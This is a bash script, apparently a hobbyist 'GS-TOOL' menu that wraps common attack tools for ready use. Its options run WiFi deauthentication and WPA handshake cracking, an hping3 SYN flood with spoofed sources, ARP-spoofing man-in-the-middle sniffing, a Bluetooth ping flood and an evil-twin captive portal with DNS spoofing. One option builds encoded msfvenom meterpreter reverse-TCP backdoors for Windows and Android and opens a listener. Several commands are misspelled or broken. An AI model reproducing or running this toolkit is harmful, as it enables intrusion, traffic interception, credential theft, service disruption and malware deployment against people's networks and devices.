#!/bin/bash 
clear



echo -e ' \e[1;33m '
echo '   ██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗               '
echo '  ██╔════╝ ██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║               '
echo -e ' \e[1;31m ██║  ███╗███████╗█████╗██║   ██║   ██║██║   ██║██║ '    
echo '  ██║   ██║╚════██║╚════╝██║   ██║   ██║██║   ██║██║               '
echo '  ╚██████╔╝███████║      ██║   ╚██████╔╝╚██████╔╝███████╗          '
echo '   ╚═════╝ ╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝          '
echo
echo
echo -e " \e[1;34m         by get-sum   "
echo -e " \e[1;31m        ------------ "
echo -e " \e[1;34m               insta _.get_sum._ "
echo -e " \e[1;31m            ----------------------- "
echo
echo -e " \e[1;35m ENTER "
echo -e " \e[1;31m "
read -p 'gs-tool : ' choix1
echo

clear








while [ test ]
do

echo    -e "\e[1;01m "
echo    -e "\e[1;31m           ----------- "
echo      -e "\e[1;34m             GS-TOOL "
echo    -e "\e[1;31m           -----------"
echo -e " \e[1;34m        by GeT-sUm           - MeNu -   "
echo -e " \e[1;31m      -------------         ----------      "
echo 
echo -e ' \e[1;31m '
echo 
read -p 'gs-tool : ' choix




if [ $choix = "monitor" ]

then
echo -e "\e[1;35m        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo
echo -e "\e[1;31m           monitor mode    for tp-link TL-WN722N , alpha network ect "
echo -e "\e[1;35m        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo              
echo -e "\e[1;33m   by get-sum"
echo " ------------"
echo -e "\e[1;31 "
echo
echo
read -p ' interface : ' interface 
sudo ifconfig wlan0 down &>/dev/null
echo [OK] $interface down
airmon-ng check kill &>/dev/null
echo [OK] check kill
iwconfig $interface mode monitor

     if [ $? -eq 0 ]
     then
     echo -e "\e[1;32" [OK] $interface mode monitor
     else
     echo -e "\e[1;31" [!] divice $interface not compatible
     fi
 

fi



if [ $choix = "help" ]
then
echo -e "\e[1;01m "
echo -e "\e[1;32m "
echo    '         -------------------------------------------------------------------------  '
echo    '         [$] clear : clear                  | [$] ifconfig : ifconfig            |  '
echo -e '\e[1;31m         -------------------------------------------------------------------------  '
echo    "         [!] don't need monitor mode  |     | [!] need monitor mode  |           |  "
echo -e '\e[1;33m         -----------------------------v------------------------------v------------  '
echo    '         [+] sniffing : sniff               | [+] monitor mode : monitor         |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] network scan : nc              | [+] crack wifi : crack             |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] ports scan : pscan (nmap)      | [+] Deauthentication Attack : da   |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] denial of service : dos        | [+] backdoor undetectable : bacd   |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] update                         | [+] bluetooth DOS : bdos           |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] install dependances : ind      | [+] captif portal attack : cpa     |  '
echo    '         -------------------------------------------------------------------------  '
fi



if [ $choix = "clear" ]
then
clear
fi


if [ $choix = "shutdown" ]
then
shutdown -h now
fi


if [ $choix = "scan" ]
then
./scan
fi


if [ $choix = "ifconfig" ]
then
echo
echo
ifconfig
echo
echo
fi


if [ $choix = "reboot" ]
then
reboot
fi


if [ $choix = "nano" ]
then
nano gs-tool
fi


if [ $choix = "reboot" ]
then
reboot
fi 


if [ $choix = "net" ]
then
rm -rf *.cap
rm -rf *.csv
rm -rf *.netxml
fi



if [ $choix = "iwconfig" ]
then
echo
echo
iwconfig
echo
echo
fi

if [ $choix = "exit" ]
then 
exit
fi

if [ $choix = "nc" ]
then


clear
echo -e "\e[1;31m       "
echo   "-----------------"
echo   "   NeTwoRk ScAn  "
echo   "-----------------"
echo
echo
xterm -title "network-scan" -hold -e ./scan | echo -e "\e[1;35m close window for stop network scan "
fi




if [ $choix = "pscan" ]
then 
clear
echo
echo -e "\e[1;33m "
echo   ------------------------
echo      - ports scaner -
echo   ------------------------
echo 
echo
echo
echo -e ' \e[1;31m '
echo
read -p ' machine ip : ' ipm 
echo
echo
ping -c 2 $ipm
nmap -sS -sV -Pn -v $ipm
fi



if [ $choix = "crack" ]
then
clear
echo
echo
echo -e ' \e[1;33m '
echo -----------------------
echo -  retrival handshak  - 
echo -----------------------
echo
echo -e ' \e[1;31m '
echo 'interface ex : wlan0, wlan0mon'
echo
echo
echo -e ' \e[1;31m '
read -p 'interface : ' winterface
echo -e ' \e[1;37m '
n_secondes=7
( xterm -title wait... -e "airodump-ng $winterface >> lewifi1.txt") &
sleep 7
kill $!
cat lewifi1.txt
rm -r -f lewifi1.txt
echo
echo
echo -e '\e[1;33m '
echo choose acces point
echo
echo
echo -e ' \e[1;31m '
read -p 'bssid: ' apbssid
echo -e ' \e[1;37m '
echo
echo
echo -e ' \e[1;31m '
read -p 'chanel : ' apch
echo -e ' \e[1;37m '
echo
echo
echo -e ' \e[1;33m '
echo    wpa, wep etc
echo  ----------------
echo
echo
echo -e ' \e[1;31m '
echo
read -p 'security : ' apsec

 if [ $apsec = "wep" ]
 then
 xterm -e airodump-ng --bssid $apbssid -c $apch $winterface | airplay-ng $winterface -c $apch -b $apbssid -r crackw &
 sleep 16
 kill $!
 aircrack-ng crackw-01.cap
 fi
  
  
              
             
              
              
              
 
 
 if [ $apsec = "wpa" ] 
 then
 echo
 echo
 echo  'name of file of capture   ex : filecap'
 echo
 echo
 echo -e ' \e[1;31m '
 read -p 'file : ' filecap1
 echo -e ' \e[1;37m '
 echo
 echo
 echo
 echo
 n_secondes=7
 ( xterm -title wait... -e "airodump-ng -c $apch --bssid $apbssid $winterface >> lewifi1.txt") &
 sleep 7
 kill $!
 echo [ok]
 rm -r -f lewifi1.txt
 echo
 echo
 xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $filecap1 $winterface | xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface | echo -e  '\e[1;35m  close window if there is hanshake '
 echo
 echo
 echo
 echo
 echo -e  '\e[1;33m '
 echo ------------------
 echo   crack handshake
 echo  - aircrack-ng -
 echo ------------------
 echo
 echo
 echo
 echo
 echo
 echo
 echo
 echo
 crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a wpa $filecap1-01.cap
 echo
 echo
 clear
 fi
fi




if [ $choix = "dos" ]
then
clear
echo
echo
echo -e  '\e[1;33m '
echo   -----------------------
echo   -  DeNiAl-Of-SeRvIcE  -
echo   -----------------------
echo    -  ip of the target - 
echo    ---------------------
echo
echo
echo
echo  
echo
echo -e  '\e[1;31m '
read -p 'ip : ' ipdos
echo
echo
echo
echo
echo
xterm -title DOS -e "hping3 -c 1000000 -d 120 -S -w 64 -p 21 --flood --rand-source $ipdos &>/dev/null"
fi









if [ $choix = "ls" ]
then
ls
fi


if [ $choix = "shell" ]
then
exit
fi




if [ $choix = "ind" ]
then 
clear
apt-get update
apt-get install xterm
echo -e  '\e[1;32m '
echo [OK] XTERM
echo -e  '\e[1;30m '
apt-get install hping3
echo -e  '\e[1;32m '
apt-get install aircrack-ng
apt install aircrack-ng
apt install nmap
apt-get install driftnet
apt install driftnet
apt-get install urlsnarf
apt install driftnet
apt install msfvenom
apt install l2ping
echo -e  '\e[1;35m '
apt-get install l2ping
apt install apache2
echo apache2 [ok]
apt install hcitool
apt install arpspoof
apt-get install arpspoof
apt install nslookup
apt-get install nslookup
clear
echo '[end]'
fi



if [ $choix = "sniff" ]
then
clear
echo 
echo -e  '\e[1;31m '
echo -----------------------
echo    - sniffing mitm -
echo -----------------------
echo
echo -e  '\e[1;35m '
echo  Interface
echo
echo -e  '\e[1;31m '
read -p 'interface : ' interfacesn
echo -e  '\e[1;37m '
n_secondes=10
( xterm -title wait... -e "netdiscover >> lewifisniff.txt") &
sleep 10
kill $!
cat lewifisniff.txt
rm -r -f lewifisniff.txt
echo
echo
echo
echo -e  '\e[1;33m '
echo  IP OF TARGET
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'ip : ' ipsn
echo -e  '\e[1;33m '
echo
echo
echo
echo -e  '\e[1;33m '
echo  FILE OF CAPTURE
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'file : ' sniffcap
echo -e  '\e[1;37m '
echo
echo
echo
echo -e  '\e[1;33m '
echo IP OF ROUTEUR
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'ip : ' routeursn
echo -e  '\e[1;37m '
echo
echo
echo
sysctl net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $interfacesn -j ACCEPT
iptables -A FORWARD -i $interfacesn -j ACCEPT
cd capture-sniffing 
   if [ $? -eq 1 ]
   then
   mkdir capture-sniffing
   else
   cd ..
   fi
xterm -title sniff1 -e arpspoof -i interfacesn -t $routeursn $ipsn | xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap" | xterm -title sniff -e "urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap"
fi









if [ $choix = "msf" ]
then
xterm -e msfconsole
fi


if [ $choix = "shark" ]
then
wireshark
fi






if [ $choix = "da" ]
then
echo -e  '\e[1;33m '
clear
echo
echo       --------------------------
echo         Deauthentication Attack
echo         - need monitor monde -
echo       --------------------------
echo
echo   -   INTERFACE : wlan0, wlan0mon    -  
echo   ------------------------------------
echo   
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'interface : ' interfaceda
n_secondes=7
(xterm -title wait... -e "airodump-ng $interfaceda >> lewifi.txt") &
sleep 7
kill $!
cat lewifi.txt
rm -r -f lewifi.txt
echo -e  '\e[1;33m '
echo
echo  -------------------------
echo   Deauthentication Attack
echo   - need monitor monde -
echo  -------------------------
echo
echo
echo -e  '\e[1;31m '
echo  acces point bssid
echo
echo
echo
echo -e  '\e[1;31m '
read -p  'bssid : ' bssidda
echo -e  '\e[1;37m '
echo
echo
echo
echo
echo   channel of acces point
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'channel : ' chanelda
echo -e  '\e[1;37m '
echo
echo
n_secondes=9
( xterm -title wait... -e "airodump-ng --bssid $bssidda -c $chanelda $interfaceda >> lewifi1234.txt") & 
sleep 9
kill $!
clear
echo -e  '\e[1;32m '
echo attack started ... 
xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda 
rm -r -f lewifi1234.txt
fi




if [ $choix = "bacd" ]
then
clear
echo  -----------------------
echo    backdoor reverse tcp
echo  -----------------------
echo os ex: windows , android
read -p ' os :' osbd
echo
echo  HOST
echo
read -p 'host : ' hostbd
echo
echo PORT
echo
read -p 'port : ' portbd
echo files name
read -p 'name : ' namebd

if [ $osbd = "windows" ] 
then
msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -e x86/shikata_ga_nai -i 11 lport=$portbd --platform windows -f exe -a x86 > $namebd.exe
echo
echo
echo
echo listening on $hostbd : $portbd
echo
echo
echo
nc -nlvp $portbd
fi

if [ $osbd = "android" ]
then
msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.apk
echo
echo
echo
echo listening on $hostbd : $portbd
echo
echo
echo
nc -nlvp $portbd
fi


fi





if [ $choix = "bdos" ]
then
echo
echo
echo
echo
echo
echo  ' -------------------------- '
echo  ' -    bluetooth attack    - '
echo  ' -------------------------- '
echo
echo
hcitool scan
echo
echo
echo
read -p 'mac address : ' macbdos
xterm -title bluetooth-DOS -e l2ping -s 10000 $macbdos
fi




if [ $choix = "cpa" ]
then
echo
echo
echo  -e  '\e[1;34m '
echo '   --------------------  '
echo '      PoRtAl  CaPtIf      '
echo -e '\e[1;31m          AtTaCk    '
echo '   --------------------  '
echo -e '\e[1;32m   not finished '
echo
echo -e  '\e[1;33m '
echo
echo
echo
echo '   -Interface used- '
echo
echo
echo
echo  -e '\e[1;31m '
read -p 'interface : ' interfacecpa
n_secondes=7
( xterm -title wait... -e "airodump-ng $interfacecpa >> lewifi1.txt") &
sleep 7
kill $!
cat lewifi1.txt
rm -r -f lewifi1.txt
echo
echo
echo
echo name of the acces point 
echo
echo
echo
read -p 'ap : ' apcpa
echo
echo
echo
echo bssid of the acces point 
echo
echo
echo
read -p 'bssid : ' bssidcpa
cd data
service apache2 start
xterm -title cpa -e "airbase-ng $interfacecpa -e $apcpa -c 6" &
ifconfig at0 up 192.168.3.1 netmask 255.255.255.0
xterm -e dhcpd -d -f -cf dhcp.conf  | xterm -title deauth -e "airelay-ng $interfacecpa -0 9999 -a $bssidcpa" &
sysctl net.ipv4.ip_forward=1
iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables -P FORWARD ACCEPT

  iptables -A INPUT -p tcp --dport 443 -j ACCEPT
  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
  iptables -A INPUT -p udp --dport 53 -j ACCEPT
  iptables -A INPUT -p udp --dport 67 -j ACCEPT

  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
    --to-destination 192.168.3.1:80
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
    --to-destination 192.168.3.1:443
  iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \
    --to-destination 192.168.3.1:53
  iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT \
    --to-destination 192.168.3.1:67
  iptables -t nat -A POSTROUTING -j MASQUERADE
xterm -title dhcp-server -e dhcpd -d -f -cf dhcpd12.conf &
xterm -e dnsspoof -i at0
fi






if [ $choix = "update" ]
then
cd ..
rm -r -f gs-tool
git clone https://github.com/GET-SUM/gs-tool
cd gs-tool
chmod 777 *
./gs-tool
echo
echo [updated programme]
fi



done
